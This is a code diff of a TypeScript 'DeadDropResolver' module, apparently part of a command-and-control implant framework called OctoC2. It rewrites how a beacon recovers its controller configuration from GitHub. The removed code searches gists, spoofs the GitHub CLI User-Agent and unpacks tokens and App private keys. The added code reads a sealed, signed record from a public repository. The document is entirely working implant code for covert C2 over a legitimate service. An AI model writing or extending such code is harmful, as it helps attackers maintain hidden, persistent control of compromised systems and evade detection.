@@ -1,119 +1,200 @@
 /**
- * OctoC2 — DeadDropResolver
+ * Anonymous deterministic recovery reader.
  *
- * Last-resort C2 recovery. Searches GitHub gists for a file named
- * data-{sha256hex(beaconId)[:16]}.bin, whose content is a libsodium
- * crypto_box_seal ciphertext (base64url) encrypted to this beacon's
- * X25519 public key.
- *
- * Resolution is fully best-effort: any error returns null.
+ * The server writes one sealed record to:
+ *   drops/<sha256(beaconId)>.bin
+ * in a dedicated public recovery repository. The beacon needs no GitHub
+ * credential to read it. After opening the X25519 sealed box, the complete
+ * configuration is verified with a pre-provisioned recovery Ed25519 key.
  */
 
-import { createHash }                    from "node:crypto";
-import { openSealBox, derivePublicKey }  from "../crypto/sodium.ts";
-import { GH_UA }                         from "../lib/constants.ts";
-import type { TentacleKind, RelayConfig, ProxyConfig } from "../types.ts";
+import {
+  recoveryDropPath,
+  verifyRecoveryRecord,
+  type RecoveryConfigurationV2,
+  type RecoveryRecordV2,
+  type RecoveryVerificationResult,
+} from "@octoc2/shared";
+import {
+  derivePublicKey,
+  openSealBox,
+} from "../crypto/sodium.ts";
+import { GH_UA } from "../lib/constants.ts";
 
-const RESOLVE_TIMEOUT_MS = 10_000;
+const DEFAULT_API_BASE = "https://api.github.com";
+const DEFAULT_TIMEOUT_MS = 10_000;
 
-export interface DeadDropPayload {
-  version:           1;
-  serverUrl?:        string;
-  token?:            string;
-  tentaclePriority?: TentacleKind[];
-  consortium?:       RelayConfig[];
-  proxyRepos?:       ProxyConfig[];
-  /** GitHub App private key PEM — allows key rotation without redeployment */
-  appPrivateKey?:    string;
-  /** GitHub App ID — needed when migrating a beacon from PAT to App auth */
-  appId?:            number;
-  /** Installation ID for the C2 repo — paired with appId */
-  installationId?:   number;
+export interface DeadDropSource {
+  owner: string;
+  repo: string;
+  ref: string;
+}
+
+export interface DeadDropVerification {
+  minimumGenerationExclusive: number;
+  signingPublicKey: Uint8Array;
+  expectedSigningKeyId: string;
+  now?: Date;
+}
+
+export interface ResolvedDeadDrop {
+  record: RecoveryRecordV2;
+  generation: number;
+  expiresAt: string;
+  configuration: RecoveryConfigurationV2;
+}
+
+export type FetchLike = (
+  input: string | URL | Request,
+  init?: RequestInit,
+) => Promise<Response>;
+
+type VerificationFailureReason = Exclude<
+  RecoveryVerificationResult,
+  { valid: true }
+>["reason"];
+
+export type DeadDropFailureReason =
+  | VerificationFailureReason
+  | "not_found"
+  | "network"
+  | "decrypt_failed";
+
+interface GitHubContentsResponse {
+  type?: unknown;
+  encoding?: unknown;
+  content?: unknown;
+}
+
+function validateSource(source: DeadDropSource): void {
+  if (
+    !/^[A-Za-z0-9_.-]+$/.test(source.owner) ||
+    !/^[A-Za-z0-9_.-]+$/.test(source.repo)
+  ) {
+    throw new Error("Recovery repository coordinates are invalid");
+  }
+  if (
+    source.ref.trim().length === 0 ||
+    source.ref.includes("\\") ||
+    source.ref.includes("..") ||
+    !/^[A-Za-z0-9_./-]+$/.test(source.ref)
+  ) {
+    throw new Error("Recovery repository ref is invalid");
+  }
 }
 
 export class DeadDropResolver {
-  /** Overridable for tests — production code leaves this at the default. */
-  private apiBase = "https://api.github.com";
+  readonly source: DeadDropSource;
+  lastFailureReason: DeadDropFailureReason | null = null;
 
-  /**
-   * @param token  GitHub API token for authenticated requests
-   * @param owner  Repo owner — accepted for API consistency; gist search is global
-   * @param repo   Repo name — accepted for API consistency; gist search is global
-   */
+  private readonly apiBase: string;
+  private readonly fetchImpl: FetchLike;
+  private readonly timeoutMs: number;
+
   constructor(
-    private readonly token: string,
-    private readonly owner: string,
-    private readonly repo:  string,
-  ) {}
+    source: DeadDropSource,
+    options: {
+      apiBase?: string;
+      fetchImpl?: FetchLike;
+      timeoutMs?: number;
+    } = {},
+  ) {
+    validateSource(source);
+    this.source = { ...source };
+    this.apiBase = (options.apiBase ?? DEFAULT_API_BASE).replace(/\/+$/, "");
+    this.fetchImpl = options.fetchImpl ?? fetch;
+    this.timeoutMs = options.timeoutMs ?? DEFAULT_TIMEOUT_MS;
+    if (!Number.isSafeInteger(this.timeoutMs) || this.timeoutMs <= 0) {
+      throw new Error("Dead-drop timeout must be a positive safe integer");
+    }
+  }
 
-  async resolve(beaconId: string, secretKey: Uint8Array): Promise<DeadDropPayload | null> {
+  async resolve(
+    beaconId: string,
+    secretKey: Uint8Array,
+    verification: DeadDropVerification,
+  ): Promise<ResolvedDeadDrop | null> {
+    this.lastFailureReason = null;
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), this.timeoutMs);
     try {
-      const tag = createHash("sha256").update(beaconId).digest("hex").slice(0, 16);
-      const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), RESOLVE_TIMEOUT_MS);
-
-      try {
-        // 1. Search GitHub code for the gist filename
-        const searchResp = await fetch(
-          `${this.apiBase}/search/code?q=data-${tag}.bin+in:path&per_page=1`,
-          {
-            headers: {
-              Authorization: `Bearer ${this.token}`,
-              Accept: "application/vnd.github+json",
-              "User-Agent": GH_UA,
-            },
-            signal: controller.signal,
-          }
-        );
-        if (!searchResp.ok) return null;
-
-        const searchData = await searchResp.json() as {
-          total_count: number;
-          items: Array<{ html_url?: string }>;
-        };
-        if (searchData.total_count === 0 || searchData.items.length === 0) return null;
-
-        // 2. Parse gist ID from html_url like https://gist.github.com/user/abc123
-        const htmlUrl = searchData.items[0]?.html_url ?? "";
-        const gistMatch = htmlUrl.match(/gist\.github\.com\/[^/]+\/([a-f0-9]+)/);
-        if (!gistMatch) return null;
-        const gistId = gistMatch[1];
-
-        // 3. Fetch gist content
-        const gistResp = await fetch(`${this.apiBase}/gists/${gistId}`, {
+      const path = await recoveryDropPath(beaconId);
+      const { owner, repo, ref } = this.source;
+      const response = await this.fetchImpl(
+        `${this.apiBase}/repos/${encodeURIComponent(owner)}` +
+        `/${encodeURIComponent(repo)}/contents/${path}` +
+        `?ref=${encodeURIComponent(ref)}`,
+        {
           headers: {
-            Authorization: `Bearer ${this.token}`,
             Accept: "application/vnd.github+json",
-            "User-Agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
+            "X-GitHub-Api-Version": "2022-11-28",
+            "User-Agent": GH_UA,
+            "Cache-Control": "no-cache",
           },
           signal: controller.signal,
-        });
-        if (!gistResp.ok) return null;
-
-        const gistData = await gistResp.json() as {
-          files?: Record<string, { content?: string } | null>;
-        };
-        const filename = `data-${tag}.bin`;
-        const fileObj = gistData.files?.[filename];
-        if (!fileObj?.content) return null;
-        const ciphertextB64 = fileObj.content.trim();
-
-        // 4. Derive public key from secret key using scalarmult_base
-        const pubkey = await derivePublicKey(secretKey);
-
-        // 5. Open the sealed box
-        const plainBytes = await openSealBox(ciphertextB64, pubkey, secretKey);
-        const plain = new TextDecoder().decode(plainBytes);
-        const payload = JSON.parse(plain) as DeadDropPayload;
-
-        if (payload.version !== 1) return null;
-        return payload;
-      } finally {
-        clearTimeout(timer);
+        },
+      );
+      if (response.status === 404) {
+        this.lastFailureReason = "not_found";
+        return null;
       }
+      if (!response.ok) {
+        this.lastFailureReason = "network";
+        return null;
+      }
+      const contents = await response.json() as GitHubContentsResponse;
+      if (
+        contents.type !== "file" ||
+        contents.encoding !== "base64" ||
+        typeof contents.content !== "string"
+      ) {
+        this.lastFailureReason = "network";
+        return null;
+      }
+      const sealed = Buffer.from(
+        contents.content.replace(/\s+/g, ""),
+        "base64",
+      ).toString("utf8").trim();
+      if (!sealed) {
+        this.lastFailureReason = "decrypt_failed";
+        return null;
+      }
+
+      let record: RecoveryRecordV2;
+      try {
+        const publicKey = await derivePublicKey(secretKey);
+        const plaintext = await openSealBox(sealed, publicKey, secretKey);
+        record = JSON.parse(
+          new TextDecoder().decode(plaintext),
+        ) as RecoveryRecordV2;
+      } catch {
+        this.lastFailureReason = "decrypt_failed";
+        return null;
+      }
+
+      const verified = await verifyRecoveryRecord(record, {
+        beaconId,
+        minimumGenerationExclusive:
+          verification.minimumGenerationExclusive,
+        signingPublicKey: verification.signingPublicKey,
+        expectedSigningKeyId: verification.expectedSigningKeyId,
+        ...(verification.now !== undefined && { now: verification.now }),
+      });
+      if (!verified.valid) {
+        this.lastFailureReason = verified.reason;
+        return null;
+      }
+      return {
+        record,
+        generation: verified.generation,
+        expiresAt: verified.expiresAt,
+        configuration: verified.configuration,
+      };
     } catch {
-      // Best-effort: never crash the beacon on recovery attempt
+      this.lastFailureReason = "network";
       return null;
+    } finally {
+      clearTimeout(timer);
     }
   }
 }
